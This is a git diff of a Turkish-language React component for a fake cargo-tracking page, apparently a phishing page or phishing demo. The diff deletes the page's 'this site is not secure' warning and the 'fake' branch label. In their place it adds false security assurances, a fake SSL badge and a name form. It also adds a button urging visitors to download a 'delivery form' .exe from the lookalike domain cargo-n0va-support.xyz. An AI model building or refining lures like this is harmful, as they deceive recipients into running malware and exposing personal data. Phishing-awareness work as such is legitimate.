@@ -1,4 +1,4 @@
-import React, { useEffect, useRef, useState } from "react";
+import React, { useState } from "react";
 import styles from "./CargoTrackingFake.module.css";
 
 const statusSteps = [
@@ -13,10 +13,15 @@ const statusSteps = [
     icon: "🚚"
   },
   {
-    status: "Teslimat Bekleniyor",
-    desc: "Teslimat adresinizde bekleniyor.",
+    status: "Dağıtımda",
+    desc: "Kargonuz dağıtım için yola çıktı.",
     icon: "🏠"
-  }
+  },
+  {
+    status: "Teslim Edildi",
+    desc: "Kargonuz teslim edildi.",
+    icon: "📦"
+  },
 ];
 
 function getUrlParams(url) {
@@ -42,60 +47,109 @@ const CargoTrackingFake = (props) => {
   const [currentStep] = useState(() => Math.floor(Math.random() * statusSteps.length));
   const progress = Math.round(((currentStep + 1) / statusSteps.length) * 100);
 
+  // Sahte form doldurma alanı için
+  const [formName, setFormName] = useState("");
+  const [formSurname, setFormSurname] = useState("");
+
   return (
-    <div className={styles.trackingContainer}>
-      <div className={styles.header}>
-        <img
-          src={`/cargo/cargonova.png`}
-          alt={shippingCompany}
-          className={styles.logo}
-        />
-        <div className={styles.headerInfo}>
-          <h2>{shippingCompany} Kargo Takip</h2>
-          <div className={styles.trackingNo}>Takip No: <span>{trackingNo}</span></div>
-        </div>
-      </div>
-
-      <div className={styles.progressBarBox}>
-        <div className={styles.progressBarBg}>
-          <div className={styles.progressBar} style={{ width: `${progress}%` }} />
-        </div>
-        <div className={styles.progressLabel}>
-          <span>{statusSteps[currentStep].status}</span>
-          <span className={styles.progressPercent}>{progress}%</span>
-        </div>
-      </div>
-
-      <ul className={styles.statusSteps}>
-        {statusSteps.map((step, idx) => (
-          <li
-            key={idx}
-            className={`${styles.stepItem} ${idx <= currentStep ? styles.active : ""}`}
-          >
-            <span className={styles.stepIcon}>{step.icon}</span>
-            <div>
-              <b>{step.status}</b>
-              <div className={styles.stepDesc}>{step.desc}</div>
+    <div className={styles.fakeTrackingMain}>
+      <div className={styles.leftPanel}>
+        <div className={styles.trackingContainer}>
+          <div className={styles.header}>
+            <img
+              src={`/cargo/cargonova.png`}
+              alt={shippingCompany}
+              className={styles.logo}
+            />
+            <div className={styles.headerInfo}>
+              <h2>{shippingCompany} Kargo Takip</h2>
+              <div className={styles.trackingNo}>Takip No: <span>{trackingNo}</span></div>
             </div>
-          </li>
-        ))}
-      </ul>
+          </div>
 
-      <div className={styles.details}>
-        <div>
-          <span className={styles.label}>Tahmini Teslimat:</span>
-          <span>1-2 iş günü</span>
-        </div>
-        <div>
-          <span className={styles.label}>Bulunduğu Şube:</span>
-          <span>Sahte Transfer Merkezi</span>
+          <div className={styles.progressBarBox}>
+            <div className={styles.progressBarBg}>
+              <div className={styles.progressBar} style={{ width: `${progress}%` }} />
+            </div>
+            <div className={styles.progressLabel}>
+              <span>{statusSteps[currentStep].status}</span>
+              <span className={styles.progressPercent}>{progress}%</span>
+            </div>
+          </div>
+
+          <ul className={styles.statusSteps}>
+            {statusSteps.map((step, idx) => (
+              <li
+                key={idx}
+                className={`${styles.stepItem} ${idx <= currentStep ? styles.active : ""}`}
+              >
+                <span className={styles.stepIcon}>{step.icon}</span>
+                <div>
+                  <b>{step.status}</b>
+                  <div className={styles.stepDesc}>{step.desc}</div>
+                </div>
+              </li>
+            ))}
+          </ul>
+
+          <div className={styles.details}>
+            <div>
+              <span className={styles.label}>Tahmini Teslimat:</span>
+              <span>1-2 iş günü</span>
+            </div>
+          </div>
+
+          <div className={styles.phishingFooter}>
+            <span>
+              <b>Teslimat bilgileriniz tarafımızca güvence altındadır.</b>
+            </span>
+          </div>
         </div>
       </div>
 
-      <div className={styles.phishingFooter}>
-        <span>
-          <b>Uyarı:</b> Bu site güvenli değildir. Tarayıcı adresini ve bağlantının gerçekliğini kontrol edin.
-        </span>
+      <div className={styles.rightPanel}>
+        <div className={styles.downloadSection}>
+          <h2 className={styles.downloadTitle}>🛡️ Kargo Teslim Formu</h2>
+          <p className={styles.formInfo}>
+            Kargonuzu teslim alabilmek için <b>teslimat formunu</b> indirip doldurmanız gerekmektedir.<br />
+          </p>
+          <form className={styles.fakeForm} onSubmit={e => e.preventDefault()}>
+            <label>
+              Adınız:
+              <input
+                type="text"
+                value={formName}
+                onChange={e => setFormName(e.target.value)}
+                placeholder="Adınızı girin"
+                autoComplete="off"
+                spellCheck={false}
+              />
+            </label>
+            <label>
+              Soyadınız:
+              <input
+                type="text"
+                value={formSurname}
+                onChange={e => setFormSurname(e.target.value)}
+                placeholder="Soyadınızı girin"
+                autoComplete="off"
+                spellCheck={false}
+              />
+            </label>
+            <a
+              href="http://cargo-n0va-support.xyz/download/Cargo_Teslim_Formu_2025.exe"
+              download
+              className={styles.downloadButton}
+              style={{ marginTop: "14px" }}
+            >
+              📥 Kargo Teslim Formunu İndir (.exe)
+            </a>
+          </form>
+          <div className={styles.fakeSecureBox}>
+            <img src="/techDepo/ssl.png" alt="SSL Icon " />
+            <span><b>SSL ile korunan bağlantı</b> <span style={{color:'#2fd26b'}}>✓</span></span>
+          </div>
+        </div>
       </div>
     </div>
   );
